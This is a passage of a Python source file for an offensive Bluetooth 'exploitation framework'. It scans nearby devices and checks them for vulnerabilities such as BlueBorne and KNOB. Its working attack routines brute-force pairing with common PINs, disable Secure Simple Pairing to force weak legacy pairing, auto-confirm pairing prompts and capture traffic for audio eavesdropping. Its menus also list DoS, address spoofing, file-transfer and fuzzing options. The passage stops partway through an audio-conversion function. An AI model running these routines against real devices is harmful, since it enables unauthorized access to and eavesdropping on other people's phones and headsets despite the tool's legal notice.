#!/usr/bin/env python3
# Elite Bluetooth Penetration & Exploitation Framework - Blain.ma
# Developed by Anas Erami

import subprocess
import os
import time
import sys
import platform
import threading
from datetime import datetime
import re
import json
import signal
import dbus
import pexpect
import asyncio
import random 
import binascii 
from colorama import Fore, Style, init
from bleak import BleakClient, BleakScanner, BLEDevice
from pyobex.client import Client

init(autoreset=True)

class BluetoothPentestFramework:
    def __init__(self, hci_adapter='hci0'):
        self.devices = []
        self.vulnerable_devices = []
        self.current_target = None
        self.recording_process = None
        self.exploit_threads = []
        self.sniffing_process = None
        self.hci_adapter = hci_adapter

        self.config = self._load_config()
        self.scan_time = self.config.get('scan_time', 20)
        self.common_pins = self.config.get('common_pins', ["0000", "1111", "1234", "9999", "000000", "123456"])
        self.oui_file_path = self.config.get('oui_file_path', 'oui.txt')
        self.recording_dir = self.config.get('recording_dir', 'recordings')
        self.exploits_dir = self.config.get('exploits_dir', 'exploits')
        self.downloads_dir = self.config.get('downloads_dir', 'downloads')
        self.logs_dir = self.config.get('logs_dir', 'logs')
        self.vuln_defs_dir = self.config.get('vuln_defs_dir', 'vuln_definitions')
        self.crashes_dir = self.config.get('crashes_dir', 'crashes') 

        self.check_bluetooth_status()
        self.check_dependencies()
        self.setup_directories()
        self._load_vulnerability_definitions()
    
    def _load_config(self):
        config_path = 'config.json'
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    return json.load(f)
            except json.JSONDecodeError as e:
                print(f"{Fore.RED}[!] Error loading config.json: {e}. Using default settings.")
        else:
            print(f"{Fore.YELLOW}[*] config.json not found. Creating default config.json.")
            default_config = {
                "scan_time": 20,
                "common_pins": ["0000", "1111", "1234", "9999", "000000", "123456"],
                "oui_file_path": "oui.txt",
                "recording_dir": "recordings",
                "exploits_dir": "exploits",
                "downloads_dir": "downloads",
                "logs_dir": "logs",
                "vuln_defs_dir": "vuln_definitions",
                "crashes_dir": "crashes" 
            }
            with open(config_path, 'w') as f:
                json.dump(default_config, f, indent=4)
            return default_config
        return {}

    def _load_vulnerability_definitions(self):
        """Loads vulnerability definitions from external JSON files."""
        self.vuln_db = {}
        if not os.path.exists(self.vuln_defs_dir):
            os.makedirs(self.vuln_defs_dir, exist_ok=True)
            print(f"{Fore.YELLOW}[*] Created {self.vuln_defs_dir} directory. Please add vulnerability definition JSON files here.")
            self.create_default_vuln_defs() 
            
        for filename in os.listdir(self.vuln_defs_dir):
            if filename.endswith('.json'):
                filepath = os.path.join(self.vuln_defs_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        vuln_def = json.load(f)
                        if "name" in vuln_def and "detection_rules" in vuln_def:
                            self.vuln_db[vuln_def["name"]] = vuln_def
                            print(f"{Fore.CYAN}[+] Loaded vulnerability definition: {vuln_def['name']}")
                        else:
                            print(f"{Fore.YELLOW}[!] Invalid vulnerability definition file: {filename}")
                except json.JSONDecodeError as e:
                    print(f"{Fore.RED}[!] Error parsing vulnerability definition file {filename}: {e}")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error loading vulnerability definition file {filename}: {e}")

    def create_default_vuln_defs(self):
        blueborne_def = {
            "name": "BlueBorne (CVE-2017-1000251)",
            "description": "Critical vulnerabilities allowing RCE, MITM, and DoS without user interaction.",
            "severity": "CRITICAL",
            "exploit_potential": "RCE/DoS",
            "detection_rules": [
                {"type": "bt_version", "operator": "<", "value": "4.2"},
                {"type": "command_test", "command": f"l2ping -i {{hci}} -s 2000 -c 5 {{mac}}", "expected_output_not_in": "0 received"}
            ],
            "status_map": {"detected": "OPEN", "not_detected": "PATCHED"}
        }
        knob_def = {
            "name": "KNOB Attack (CVE-2019-9506)",
            "description": "Encryption key length negotiation downgrade vulnerability.",
            "severity": "HIGH",
            "exploit_potential": "Encryption Downgrade",
            "detection_rules": [
                {"type": "feature", "name": "Secure Connections", "exists": False},
                {"type": "bluetoothctl_pairing_attempt", "mac_placeholder": "{mac}"} 
            ],
            "status_map": {"detected": "OPEN", "not_detected": "SECURE"}
        }
        
        with open(os.path.join(self.vuln_defs_dir, 'blueborne.json'), 'w') as f:
            json.dump(blueborne_def, f, indent=4)
        with open(os.path.join(self.vuln_defs_dir, 'knob.json'), 'w') as f:
            json.dump(knob_def, f, indent=4)
        print(f"{Fore.YELLOW}[*] Default vulnerability definitions created in {self.vuln_defs_dir}.")


    def setup_directories(self):
        os.makedirs(self.recording_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        os.makedirs(self.downloads_dir, exist_ok=True)
        os.makedirs(self.logs_dir, exist_ok=True)
        os.makedirs(self.vuln_defs_dir, exist_ok=True)
        os.makedirs(self.crashes_dir, exist_ok=True)

    def check_bluetooth_status(self):
        print(f"{Fore.CYAN}[*] Checking Bluetooth status for {self.hci_adapter}...")
        try:
            bus = dbus.SystemBus()
            manager = dbus.Interface(bus.get_object('org.bluez', '/'),
                                    'org.freedesktop.DBus.ObjectManager')
            objects = manager.GetManagedObjects()
            
            adapter_found = False
            for path, interfaces in objects.items():
                if path.endswith(self.hci_adapter) and 'org.bluez.Adapter1' in interfaces:
                    adapter_found = True
                    self.adapter_path = path
                    adapter = dbus.Interface(bus.get_object('org.bluez', self.adapter_path),
                                            'org.bluez.Adapter1')
                    powered = adapter.Get('org.bluez.Adapter1', 'Powered')
                    if not powered:
                        print(f"{Fore.YELLOW}[*] Bluetooth is disabled. Enabling now...")
                        adapter.Set('org.bluez.Adapter1', 'Powered', dbus.Boolean(1))
                        time.sleep(2)
                        powered_after = adapter.Get('org.bluez.Adapter1', 'Powered')
                        if powered_after:
                            print(f"{Fore.GREEN}[+] Bluetooth enabled successfully")
                        else:
                            print(f"{Fore.RED}[!] Failed to enable Bluetooth")
                            sys.exit(1)
                    else:
                        print(f"{Fore.GREEN}[+] Bluetooth is already enabled")
                    break
            
            if not adapter_found:
                print(f"{Fore.RED}[!] Bluetooth adapter {self.hci_adapter} not found. Please check your adapter name.")
                sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[!] DBus error: {str(e)}")
            sys.exit(1)
    
    def check_dependencies(self):
        required_cmds = ["hcitool", "bluetoothctl", "sdptool", "l2ping", "gatttool", 
                         "ffmpeg", "ubertooth-util", "btmgmt", "dbus-send", "dumpcap"]
        
        missing = []
        for tool in required_cmds:
            try:
                subprocess.check_output(f"which {tool}", shell=True, stderr=subprocess.PIPE)
            except subprocess.CalledProcessError:
                missing.append(tool)
        
        try:
            subprocess.check_output("gr-bluetooth --help", shell=True, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            missing.append("gr-bluetooth (GNU Radio Bluetooth tools)")

        try:
            import bleak
            import pyobex
            import pexpect
            import dbus
        except ImportError as e:
            missing.append(f"Python module: {e.name}")
        
        if missing:
            print(f"{Fore.RED}[!] Missing tools/dependencies: {', '.join(missing)}")
            print(f"{Fore.YELLOW}[*] For command-line tools, install with: sudo apt install bluez bluez-tools ffmpeg ubertooth gr-bluetooth obexftp wireshark")
            print(f"{Fore.YELLOW}[*] For Python modules, install with: pip install colorama bleak pyobex pexpect dbus-python")
            sys.exit(1)
    
    def run_cmd(self, cmd, background=False, check_output=True, timeout=None):
        try:
            if background:
                process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return process
            else:
                result = subprocess.run(cmd, shell=True, text=True, capture_output=True, check=check_output, timeout=timeout)
                return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            return ""
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[!] Command '{cmd.split()[0]}' timed out after {timeout} seconds.")
            return ""
        except Exception as e:
            print(f"{Fore.RED}[!] Command execution failed for '{cmd.split()[0]}'. Error: {str(e)}")
            return ""
    
    def show_banner(self):
        banner = fr"""{Fore.GREEN} 
 ____  _       _         _             
| __ )| | __ _(_)_ __   (_) __ _ _ __  
|  _ \| |/ _` | | '_ \  | |/ _` | '_ \ 
| |_) | | (_| | | | | |_| | (_| | | | |
|____/|_|\__,_|_|_| |_(_)_|\__,_|_| |_|

{Style.RESET_ALL}{Fore.CYAN}Elite Bluetooth Penetration & Exploitation Framework v6.0{Style.RESET_ALL}
        {Fore.YELLOW}Developed by Anas Erami | {datetime.now().strftime('%Y-%m-%d')}
        """
        print(banner)
        print(f"{Fore.MAGENTA}[*] Initializing advanced Bluetooth penetration testing on {self.hci_adapter}")
        print(f"{Fore.CYAN}──────────────────────────────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] LEGAL NOTICE: Only use this tool on devices you own or have explicit permission to test")
        print(f"{Fore.RED}[!] Unauthorized use is illegal and unethical")
    
    async def scan_devices(self):
        print(f"{Fore.GREEN}[*] Scanning Bluetooth devices ({self.scan_time} seconds) on {self.hci_adapter}...")
        
        classic_devices = []
        ble_devices = []
        
        await asyncio.gather(
            self.advanced_classic_scan(classic_devices),
            self.advanced_ble_scan(ble_devices)
        )
        
        self.devices = self._merge_scanned_devices(classic_devices, ble_devices)
        
        print(f"\n{Fore.GREEN}[+] Scan completed: {len(self.devices)} unique devices found")
        self.save_scan_results()
    
    async def advanced_classic_scan(self, classic_devices_list):
        try:
            print(f"{Fore.CYAN}[*] Starting Classic Bluetooth scan...")
            scan_process = self.run_cmd(f"bluetoothctl -a --timeout {self.scan_time} scan on", background=True)
            time.sleep(self.scan_time + 5)
            self.run_cmd("bluetoothctl scan off")
            
            output = self.run_cmd("bluetoothctl devices")
            
            for line in output.splitlines():
                if "Device" in line:
                    parts = line.split()
                    mac = parts[1]
                    name = " ".join(parts[2:]) if len(parts) > 2 else "Unknown"
                    
                    device_info = {
                        'mac': mac, 
                        'name': name, 
                        'type': 'Classic',
                        'vendor': self.get_vendor(mac),
                        'class': "N/A", 
                        'rssi': "N/A", 
                        'services_sdp': "",
                        'bt_version': "N/A",
                        'features': "",
                        'paired': False 
                    }
                    classic_devices_list.append(device_info)
                    self.get_detailed_classic_info(device_info)
        except Exception as e:
            print(f"{Fore.RED}[!] Advanced Classic scan error: {str(e)}")

    async def advanced_ble_scan(self, ble_devices_list):
        print(f"{Fore.CYAN}[*] Starting BLE scan with Bleak...")
        try:
            devices = await BleakScanner.discover(timeout=self.scan_time, adapter=self.hci_adapter)
            for d in devices:
                device_info = {
                    'mac': d.address, 
                    'name': d.name or "Unknown BLE", 
                    'type': 'BLE',
                    'vendor': self.get_vendor(d.address),
                    'rssi': d.rssi,
                    'services_advertised': list(d.metadata.get('uuids', [])) if d.metadata else [],
                    'manufacturer_data': d.metadata.get('manufacturer_data', {}) if d.metadata else {},
                    'paired': False 
                }
                ble_devices_list.append(device_info)
                paired_output = self.run_cmd(f"bluetoothctl info {d.address} | grep Paired")
                if "yes" in paired_output.lower():
                    device_info['paired'] = True
        except Exception as e:
            print(f"{Fore.RED}[!] Advanced BLE scan error: {str(e)}")

    def _merge_scanned_devices(self, classic_devices, ble_devices):
        """Merges classic and BLE scan results for dual-mode devices."""
        merged_devices = {d['mac']: d for d in classic_devices}

        for ble_d in ble_devices:
            if ble_d['mac'] in merged_devices:
                existing_d = merged_devices[ble_d['mac']]
                existing_d['type'] = 'Dual-Mode'
                existing_d['ble_info'] = {
                    'name': ble_d['name'],
                    'rssi': ble_d['rssi'],
                    'services_advertised': ble_d['services_advertised'],
                    'manufacturer_data': ble_d['manufacturer_data']
                }
                if "Unknown" in existing_d['name'] and ble_d['name'] and "Unknown" not in ble_d['name']:
                    existing_d['name'] = ble_d['name']
                if ble_d['paired']:
                    existing_d['paired'] = True
            else:
                merged_devices[ble_d['mac']] = ble_d
        
        return list(merged_devices.values())
    
    def get_detailed_classic_info(self, device_entry):
        mac = device_entry['mac']
        
        info_output = self.run_cmd(f"hcitool -i {self.hci_adapter} info {mac}")
        if info_output:
            device_entry['bt_version'] = self.get_bt_version(info_output)
            device_entry['class'] = re.search(r"Device Class: ([\w:]+)", info_output).group(1) if re.search(r"Device Class: ([\w:]+)", info_output) else "N/A"
            device_entry['features'] = self.run_cmd(f"hcitool -i {self.hci_adapter} features {mac}")
        
        rssi_output = self.run_cmd(f"hcitool -i {self.hci_adapter} rssi {mac}")
        if rssi_output and "RSSI" in rssi_output:
            device_entry['rssi'] = rssi_output.split(":")[1].strip()

        paired_output = self.run_cmd(f"bluetoothctl info {mac} | grep Paired")
        if "yes" in paired_output.lower():
            device_entry['paired'] = True

        device_entry['services_sdp'] = self.run_cmd(f"sdptool browse {mac}")

    def get_vendor(self, mac):
        oui_prefix = mac[:8].upper().replace(':', '')
        
        vendors = {
            "DC85DE": "Apple", "A4C138": "Samsung", "001813": "Sony",
            "9CADEF": "Google", "0CAE7D": "Microsoft", "7440BB": "Xiaomi",
            "B827EB": "Raspberry Pi", "001A7D": "Logitech", "001BDC": "Bose",
            "000E6D": "Jabra"
        }
        
        try:
            with open(self.oui_file_path, 'r') as f:
                for line in f:
                    if oui_prefix in line:
                        return line.split('\t')[2].strip()
        except FileNotFoundError:
            pass
        
        return vendors.get(oui_prefix, "Unknown Vendor")
    
    def show_menu(self):
        print(f"\n{Fore.CYAN}┌─────────────────[ MAIN MENU ]─────────────────┐")
        print(f"│ {Fore.YELLOW}1. Show discovered devices                    {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}2. Advanced vulnerability assessment         {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}3. Target specific device                     {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}4. Exploitation toolkit                       {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}5. Bluetooth Sniffing / Monitoring           {Fore.CYAN}│")
        print(f"│ {Fore.YELLOW}6. Exit                                      {Fore.CYAN}│")
        print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
        return input(f"{Fore.GREEN}[>] Select option: ")
    
    def display_devices(self):

        print(f"\n{Fore.CYAN}┌───────────────[ DISCOVERED DEVICES ]───────────────┐")
        for i, device in enumerate(self.devices, 1):
            status = f"{Fore.RED}VULNERABLE" if 'vulnerabilities' in device else f"{Fore.GREEN}SECURE"
            paired_status = f"{Fore.MAGENTA}PAIRED" if device.get('paired', False) else f"{Fore.WHITE}NOT PAIRED"
            
            dev_type = device['type']
            if dev_type == 'Dual-Mode':
                display_type = f"Dual ({device.get('ble_info', {}).get('name', 'BLE')})"
            else:
                display_type = device['type']

            print(f"│ {i}. {device['name'][:20]:<20} {device['mac']} {paired_status}{Style.RESET_ALL}│")
            print(f"│   ├─ Type: {display_type:<14} Vendor: {device['vendor'][:15]:<15} RSSI: {device.get('rssi', 'N/A'):<5} │")
            print(f"│   ├─ Class: {device.get('class', 'N/A')[:15]:<15} BT Ver: {device.get('bt_version', 'N/A'):<8} │")
            
            if 'vulnerabilities' in device:
                vuln_count = len(device['vulnerabilities'])
                print(f"│   └─ Status: {status}{Style.RESET_ALL} ({vuln_count} vulns) │")
            else:
                print(f"│   └─ Status: {status}{Style.RESET_ALL} {'':<14}│")
        print(f"└────────────────────────────────────────────────────┘")
    
    def get_bt_version(self, info_output):
        match = re.search(r"LMP Version: ([\d.]+)", info_output)
        if match:
            return match.group(1)
        return "Unknown"

    async def advanced_vulnerability_assessment(self):
        print(f"\n{Fore.RED}[*] Starting advanced vulnerability assessment...")
        
        self.vulnerable_devices = []
        
        for device in self.devices:
            print(f"{Fore.YELLOW}[*] Assessing {device['name']} ({device['mac']})...")
            
            if device['type'] == 'Classic' or device['type'] == 'Dual-Mode':
                self.get_detailed_classic_info(device)
            
            if device['type'] == 'BLE' or device['type'] == 'Dual-Mode':
                device['gatt_services'] = await self.scan_gatt_services(device['mac'])
            
            vulnerabilities = []
            
            for vuln_name, vuln_def in self.vuln_db.items():
                all_rules_met = True
                
                for rule in vuln_def.get('detection_rules', []):
                    rule_met = False
                    
                    if rule['type'] == "bt_version":
                        dev_version = float(device.get('bt_version', '0'))
                        val = float(rule['value'])
                        if rule['operator'] == "<" and dev_version < val: rule_met = True
                        elif rule['operator'] == "==" and dev_version == val: rule_met = True
                        elif rule['operator'] == ">" and dev_version > val: rule_met = True
                    elif rule['type'] == "feature":
                        if rule['exists'] == (rule['name'] in device.get('features', '')): rule_met = True
                    elif rule['type'] == "service_sdp":
                        if rule['name'] in device.get('services_sdp', ''): rule_met = True
                    elif rule['type'] == "gatt_service_uuid":
                        if device['type'] in ['BLE', 'Dual-Mode'] and rule['uuid'] in device.get('gatt_services', {}): rule_met = True
                    elif rule['type'] == "command_test":
                        cmd = rule['command'].format(mac=device['mac'], hci=self.hci_adapter)
                        output = self.run_cmd(cmd, check_output=False, timeout=10)
                        if rule.get('expected_output_not_in') and rule['expected_output_not_in'] not in output:
                            rule_met = True
                        elif rule.get('expected_output_in') and rule['expected_output_in'] in output:
                            rule_met = True
                    elif rule['type'] == "bluetoothctl_pairing_attempt":
                        print(f"{Fore.YELLOW}  [*] Performing pairing test for {vuln_name}...")
                        if self._bluetoothctl_pair(device['mac'], pin=self.common_pins[0] if self.common_pins else None):
                            rule_met = True
                    else:
                        print(f"{Fore.YELLOW}[!] Unknown rule type: {rule['type']}")
                        all_rules_met = False
                        break

                    if not rule_met:
                        all_rules_met = False
                        break
                
                if all_rules_met:
                    vulnerabilities.append({
                        "name": vuln_def['name'],
                        "severity": vuln_def['severity'],
                        "status": vuln_def.get('status_map', {}).get('detected', 'OPEN'),
                        "exploit": vuln_def['exploit_potential']
                    })
            
            if vulnerabilities:
                device['vulnerabilities'] = vulnerabilities
                self.vulnerable_devices.append(device)
        
        print(f"{Fore.GREEN}[+] Vulnerability assessment completed!")
        self.display_results()
        self.save_vulnerability_report()
    
    async def scan_gatt_services(self, mac):
        print(f"{Fore.CYAN}  [*] Scanning GATT services with Bleak for {mac}...")
        services_data = {}
        try:
            client = BleakClient(mac, adapter=self.hci_adapter)
            if not client.is_connected:
                print(f"{Fore.YELLOW}  [-] Attempting to connect to BLE device for GATT scan...")
                await client.connect(timeout=10)
                print(f"{Fore.GREEN}  [+] Connected to BLE device.")

            for service in client.services:
                chars_data = {}
                for char in service.characteristics:
                    char_props = char.properties
                    char_value = "N/A"
                    if "read" in char_props:
                        try:
                            read_bytes = await client.read_gatt_char(char.uuid)
                            try:
                                char_value = read_bytes.decode('utf-8', errors='ignore').strip()
                            except:
                                char_value = binascii.hexlify(read_bytes).decode('ascii')
                        except Exception as e:
                            char_value = f"Error reading: {e}"
                    chars_data[char.uuid] = {
                        "properties": char_props,
                        "value": char_value
                    }
                services_data[service.uuid] = {
                    "description": service.description,
                    "characteristics": chars_data
                }
            await client.disconnect()
            print(f"{Fore.GREEN}  [+] GATT scan complete for {mac}")
        except Exception as e:
            print(f"{Fore.RED}  [!] GATT scan failed for {mac}: {str(e)}")
        return services_data
    
    def display_results(self):

        print(f"\n{Fore.CYAN}┌────────────────────[ VULNERABILITY REPORT ]────────────────────┐")
        if not self.vulnerable_devices:
            print(f"│ {Fore.GREEN}No critical vulnerabilities found in scanned devices.{Style.RESET_ALL}      │")
            print(f"└────────────────────────────────────────────────────────────────┘")
            return

        for device in self.vulnerable_devices:
            print(f"│ {Fore.YELLOW}{device['name']} ({device['mac']})")
            print(f"│ {Fore.CYAN}├─ Vendor: {device['vendor']} | BT: {device['bt_version']} | Type: {device['type']} | Paired: {device['paired']}")
            
            if device.get('services_sdp'):
                print(f"│ {Fore.CYAN}├─ SDP Services: {', '.join(re.findall(r"Service Name: (.*)", device['services_sdp'])) or 'None'}")
            if device.get('gatt_services'):
                print(f"│ {Fore.CYAN}├─ GATT Services ({len(device['gatt_services'])} found):")
                for uuid, data in device['gatt_services'].items():
                    print(f"│     ├─ UUID: {uuid} ({data.get('description', 'N/A')})")
                    for char_uuid, char_data in data['characteristics'].items():
                        print(f"│     │   ├─ Char UUID: {char_uuid} (Props: {', '.join(char_data['properties'])})")
                        print(f"│     │   └─ Value: {char_data['value']}")

            print(f"│ {Fore.CYAN}├─ Identified Vulnerabilities:")
            for vuln in device['vulnerabilities']:
                status_color = Fore.RED if vuln['status'] == "OPEN" else Fore.YELLOW if vuln['status'] == "PARTIAL" else Fore.GREEN
                print(f"│ {Fore.CYAN}├─ {vuln['name']}")
                print(f"│   ├─ Severity: {Fore.RED if vuln['severity'] == 'CRITICAL' else Fore.YELLOW if vuln['severity'] == 'HIGH' else Fore.BLUE}{vuln['severity']}{Style.RESET_ALL}")
                print(f"│   ├─ Status:   {status_color}{vuln['status']}{Style.RESET_ALL}")
                print(f"│   └─ Exploit:  {vuln['exploit']}")
            
            print(f"│ {Fore.CYAN}├───────────────────────────────────────────────────│")
        print(f"└────────────────────────────────────────────────────────────────┘")
    
    def target_device(self):
        self.display_devices()
        try:
            choice = int(input(f"{Fore.GREEN}[>] Select device number: "))
            if 1 <= choice <= len(self.devices):
                self.current_target = self.devices[choice-1]
                print(f"{Fore.GREEN}[+] Target set: {self.current_target['name']} ({self.current_target['mac']})")
                asyncio.run(self.exploitation_menu())
            else:
                print(f"{Fore.RED}[!] Invalid selection")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input. Please enter a number.")
        except Exception as e:
            print(f"{Fore.RED}[!] An error occurred: {str(e)}")
    
    async def exploitation_menu(self):
        while True:
            print(f"\n{Fore.CYAN}┌──────────[ EXPLOITATION: {self.current_target['name']} ({self.current_target['mac']}) ]──────────┐")
            print(f"│ {Fore.YELLOW}1. A2DP Audio Eavesdropping (Ubertooth)    {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. AVRCP Remote Hijacking                  {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}3. OBEX File Operations (List/Download/Upload){Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}4. BLE Service Exploitation                {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}5. Bluetooth Pairing Exploits              {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}6. Launch DoS Attack                       {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}7. BLE Address Spoofing                    {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}8. Zero-Day Fuzzing Engine (NEW)           {Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}9. Return to main menu                     {Fore.CYAN}│")
            print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
            
            choice = input(f"{Fore.GREEN}[>] Select exploit: ")
            
            if choice == '1':
                self.a2dp_eavesdropping()
            elif choice == '2':
                self.avrcp_hijacking()
            elif choice == '3':
                self.obex_operations()
            elif choice == '4':
                await self.ble_exploitation()
            elif choice == '5':
                self.pairing_exploits_menu()
            elif choice == '6':
                await self.dos_attack()
            elif choice == '7':
                await self.ble_address_spoofing()
            elif choice == '8':
                await self.fuzzing_menu()
            elif choice == '9':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")

    def pairing_exploits_menu(self):
        if self.current_target['type'] == 'BLE':
            print(f"{Fore.RED}[!] Pairing exploits primarily target Classic Bluetooth.")
            print(f"{Fore.RED}[!] BLE pairing is handled differently. Consider 'BLE Service Exploitation' for BLE devices.")
            return

        while True:
            print(f"\n{Fore.CYAN}┌──────────[ PAIRING EXPLOITS: {self.current_target['mac']} ]──────────┐")
            print(f"│ {Fore.YELLOW}1. Attempt Forced Pairing (No PIN/Common PINs){Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}2. Attempt Authentication Bypass (BIAS related){Fore.CYAN}│")
            print(f"│ {Fore.YELLOW}3. Back to exploitation menu                {Fore.CYAN}│")
            print(f"└───────────────────────────────────────────────┘{Style.RESET_ALL}")
            
            choice = input(f"{Fore.GREEN}[>] Select pairing exploit: ")
            
            if choice == '1':
                self.attempt_forced_pairing()
            elif choice == '2':
                self.attempt_authentication_bypass()
            elif choice == '3':
                break
            else:
                print(f"{Fore.RED}[!] Invalid selection")

    def attempt_forced_pairing(self):
        mac = self.current_target['mac']
        print(f"\n{Fore.RED}[*] Attempting forced pairing with {mac}...")
        
        print(f"{Fore.YELLOW}[*] Trying to pair without PIN...")
        if self._bluetoothctl_pair(mac, pin=None):
            print(f"{Fore.GREEN}[+] Forced pairing successful (no PIN required or accepted silently)!")
            self.current_target['paired'] = True
            return
        
        print(f"{Fore.YELLOW}[*] Trying common PINs...")
        for pin in self.common_pins:
            print(f"{Fore.YELLOW}  Trying PIN: {pin}")
            if self._bluetoothctl_pair(mac, pin=pin):
                print(f"{Fore.GREEN}[+] Forced pairing successful with common PIN: {pin}!")
                self.current_target['paired'] = True
                return
        
        print(f"{Fore.RED}[!] Forced pairing failed. Device likely requires user confirmation or a complex PIN.")
        print(f"{Fore.CYAN}[*] This could indicate good security or simply a standard pairing process.")

    def _bluetoothctl_pair(self, mac, pin=None):
        try:
            self.run_cmd(f"bluetoothctl remove {mac}", check_output=False)
            time.sleep(1)

            child = pexpect.spawn(f"bluetoothctl", timeout=30)
            child.sendline("agent on")
            child.expect("Agent registered")
            child.sendline("default-agent")
            child.expect("Default agent set")
            child.sendline(f"pair {mac}")

            index = child.expect([
                pexpect.TIMEOUT,
                "Pairing successful",
                "Failed to pair",
                "AuthenticationCancelled",
                "PIN code:",
                "Passkey:",
                "Confirm passkey",
                "Authorize service"
            ], timeout=20)

            if index == 1:
                child.sendline("quit")
                child.close()
                return True
            elif index == 4 or index == 5:
                if pin:
                    print(f"{Fore.YELLOW}  [>] Sending PIN/Passkey: {pin}")
                    child.sendline(pin)
                    pin_index = child.expect([pexpect.TIMEOUT, "Pairing successful", "Failed to pair", "AuthenticationCancelled"], timeout=10)
                    child.sendline("quit")
                    child.close()
                    return pin_index == 1
                else:
                    print(f"{Fore.YELLOW}  [-] Device requires PIN/Passkey. No PIN provided for this attempt.")
            elif index == 6:
                print(f"{Fore.YELLOW}  [>] Confirming passkey (assuming user confirms on target device)...")
                child.sendline("yes")
                confirm_index = child.expect([pexpect.TIMEOUT, "Pairing successful", "Failed to pair", "AuthenticationCancelled"], timeout=10)
                child.sendline("quit")
                child.close()
                return confirm_index == 1
            elif index == 7:
                print(f"{Fore.YELLOW}  [>] Authorizing service (assuming user authorizes on target device)...")
                child.sendline("yes")
                auth_index = child.expect([pexpect.TIMEOUT, "Pairing successful", "Failed to pair", "AuthenticationCancelled"], timeout=10)
                child.sendline("quit")
                child.close()
                return auth_index == 1
            else:
                print(f"{Fore.YELLOW}  [-] Pairing attempt for {mac} result: {child.before.decode(errors='ignore').strip()}")
            
            child.sendline("quit")
            child.close()
            return False
        except pexpect.exceptions.TIMEOUT:
            print(f"{Fore.RED}  [!] bluetoothctl timed out during pairing attempt.")
            if 'child' in locals() and child.isalive():
                child.close()
            return False
        except Exception as e:
            print(f"{Fore.RED}  [!] Error during bluetoothctl pairing: {str(e)}")
            if 'child' in locals() and child.isalive():
                child.close()
            return False

    def attempt_authentication_bypass(self):
        mac = self.current_target['mac']
        print(f"\n{Fore.RED}[*] Attempting authentication bypass on {mac} (BIAS/Legacy Pairing related)...")
        
        print(f"{Fore.YELLOW}[*] This attack tries to force a legacy pairing mode or exploit host stack vulnerabilities.")
        print(f"{Fore.CYAN}[*] Disabling Secure Simple Pairing (SSP) on local adapter {self.hci_adapter}...")
        
        try:
            self.run_cmd(f"btmgmt -i {self.hci_adapter} ssp off", check_output=False)
            print(f"{Fore.YELLOW}  [!] Secure Simple Pairing temporarily disabled on local adapter.")
            
            if self._bluetoothctl_pair(mac, pin=self.common_pins[0] if self.common_pins else None):
                print(f"{Fore.RED}[!] Authentication bypass MAY BE SUCCESSFUL (Paired in legacy/weak mode)!")
                self.current_target['paired'] = True
            else:
                print(f"{Fore.GREEN}[+] Authentication bypass attempt did not succeed (device resisted).")
            
            self.run_cmd(f"btmgmt -i {self.hci_adapter} ssp on")
            print(f"{Fore.YELLOW}  [+] Secure Simple Pairing re-enabled on local adapter.")

        except Exception as e:
            print(f"{Fore.RED}[!] Authentication bypass attempt failed: {str(e)}")

    def a2dp_eavesdropping(self):
        print(f"\n{Fore.RED}[*] Starting A2DP Eavesdropping with Ubertooth...")
        
        if not self.check_ubertooth():
            print(f"{Fore.RED}[!] Ubertooth device not detected or tools not available. Cannot proceed with A2DP eavesdropping.")
            return
        
        filename_pcap = os.path.join(self.recording_dir, f"a2dp_{self.current_target['mac'].replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap")
        
        print(f"{Fore.YELLOW}[*] Capturing A2DP traffic to {filename_pcap}")
        print(f"{Fore.CYAN}[*] This may take several minutes. Press Ctrl+C to stop...")
        
        try:
            print(f"{Fore.YELLOW}[*] Warning: Ubertooth-btle is for BLE. For Classic BT A2DP, you need a specific Classic BT sniffer (e.g., Ubertooth-BT or SDR capable of Classic BT).")
            print(f"{Fore.YELLOW}[*] This will capture generic BT traffic. You may need to filter later in Wireshark.")
            
            self.recording_process = self.run_cmd(f"ubertooth-btle -f -c {filename_pcap}", background=True, check_output=False)
            
            input(f"{Fore.YELLOW}[*] Press Enter to stop capture and attempt conversion...")
            
            if self.recording_process and self.recording_process.poll() is None:
                os.killpg(os.getpgid(self.recording_process.pid), signal.SIGTERM)
                print(f"\n{Fore.GREEN}[+] Capture stopped.")
            else:
                print(f"{Fore.RED}[!] Recording process was not active or stopped unexpectedly.")

            print(f"{Fore.GREEN}[+] Attempting to convert {filename_pcap} to audio...")
            self.convert_to_audio(filename_pcap)
            
        except Exception as e:
            print(f"{Fore.RED}[!] Eavesdropping failed: {str(e)}")
        finally:
            self.stop_recording()
    
    def check_ubertooth(self):
        try:
            output = self.run_cmd("ubertooth-util -v", check_output=False, timeout=5)
            if "Firmware revision" in output or "ubertooth-btle" in output:
                return True
            print(f"{Fore.RED}[!] Ubertooth device not detected or response unexpected.")
            return False
        except Exception:
            print(f"{Fore.RED}[!] Ubertooth tools not available (e.g., ubertooth-util not found in PATH).")
            return False
    
    def convert_to_audio(self, pcap_file):
        try:
